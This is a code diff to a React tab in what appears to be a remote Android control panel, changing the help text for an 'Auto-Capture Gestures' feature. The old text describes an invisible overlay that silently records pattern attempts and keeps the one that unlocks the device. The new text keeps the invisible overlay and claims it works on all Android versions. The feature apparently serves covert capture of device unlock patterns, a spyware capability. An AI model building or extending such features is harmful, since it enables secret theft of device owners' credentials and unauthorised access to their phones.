@@ -605,14 +605,14 @@ export default function GestureTab({ device, sendCommand, results }) {
               Auto-Capture Gestures
             </div>
             <div style={{ fontSize: 13, color: '#64748b', marginBottom: 10, lineHeight: 1.7 }}>
-              When enabled, the overlay is <strong style={{ color: '#e2e8f0' }}>completely invisible</strong> — the device screen looks and behaves normally.
-              Each pattern attempt is recorded silently. Only the gesture that successfully unlocks the device is saved; failed attempts are discarded automatically.
+              Start capture, perform your gesture on the device, then press <strong style={{ color: '#e2e8f0' }}>Stop & Save</strong>.
+              The overlay is <strong style={{ color: '#e2e8f0' }}>completely invisible</strong> and works on all Android versions.
             </div>
             <div style={{ fontSize: 12, color: '#475569', marginBottom: 14, padding: '8px 12px', background: '#0f172a', borderRadius: 8, border: '1px solid #1e293b' }}>
-              👆 Finger down → gesture recording starts<br />
-              ✅ Finger up + device unlocks → gesture saved<br />
-              ❌ Finger up + still locked → discarded, ready for next attempt<br />
-              🚫 Simple tap (&lt;10 pts) → always discarded
+              1. Press <strong style={{ color: '#94a3b8' }}>Start Auto-Capture</strong><br />
+              2. Perform your gesture on the device<br />
+              3. Press <strong style={{ color: '#94a3b8' }}>Stop & Save</strong> — gesture is saved automatically<br />
+              🚫 Simple tap (&lt;10 pts or &lt;150ms) → discarded
             </div>
             <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap' }}>
               <button
